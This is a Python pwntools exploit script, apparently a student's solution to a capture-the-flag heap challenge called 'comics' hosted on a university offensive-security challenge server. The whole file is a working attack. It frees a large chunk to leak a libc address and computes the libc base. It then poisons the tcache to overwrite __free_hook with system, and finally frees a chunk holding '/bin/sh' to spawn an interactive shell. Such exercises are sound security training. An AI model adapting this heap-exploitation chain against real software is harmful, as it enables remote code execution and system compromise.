from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./comics"

LOCAL = False

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    continue
    ''', aslr=False)
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1214)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"

def menu(p, option):
    p.recvuntil(b"> ")
    p.sendline(str(option).encode())

def add_comic(p, comic):
    p.recvuntil(b"> ")
    p.send(comic)
    p.recvuntil(b"bytes\n")

def edit_comic(p, comic_number, comic):
    p.recvuntil(b"> ")
    p.sendline(str(comic_number).encode())
    p.recvuntil(b"> ")
    p.send(comic)

def delete_comic(p, comic_number):
    p.recvuntil(b"> ")
    p.sendline(str(comic_number).encode())

def read_comic(p, comic_number):
    p.recvuntil(b"> ")
    p.sendline(str(comic_number).encode())
    for i in range(5):
        p.recvline()
    comic = p.recvline()
    comic = comic[comic.find(b"          "):len(b"          ") + 8*4].strip()
    comic = u64(comic.ljust(8, b'\x00'))
    print(f'comic: {hex(comic)}')
    p.recvuntil(b"===---...\n")
    return comic

# Create a larg comic to get unsorted bin when we free it, also add a small one after as a guard.
menu(p, 1)
add_comic(p, b"A" * 0x410)  # comic 1
menu(p, 1)
add_comic(p, b"B" * 0x40)  # comic 2
menu(p, 1)
add_comic(p, b"C" * 0x40)  # comic 3
menu(p, 4)
delete_comic(p, 0) # free comic 1
menu(p, 2)
glibc_leak = read_comic(p, 0)
glibc_base = (glibc_leak & ~0xfff) - 0x1ec000
print(f'glibc_base: {hex(glibc_base)}')
libc_elf = ELF(libc)
libc_elf.address = glibc_base
system = libc_elf.symbols.system
print(f'system: {hex(system)}')
free_hook = libc_elf.symbols.__free_hook
print(f'free_hook: {hex(free_hook)}')


menu(p, 4)
delete_comic(p, 1) # free comic 1
menu(p, 4)
delete_comic(p, 2) # free comic 1
menu(p, 3)
edit_comic(p, 2, p64(free_hook))
menu(p, 1)
add_comic(p, b'C' * 0x40)  # comic 2
menu(p, 1)
add_comic(p, p64(system) + b'S' * 0x38)  # comic 1

menu(p, 3)
edit_comic(p, 2, b'/bin/sh\x00')
menu(p, 4)
delete_comic(p, 2) # free comic 2

p.interactive()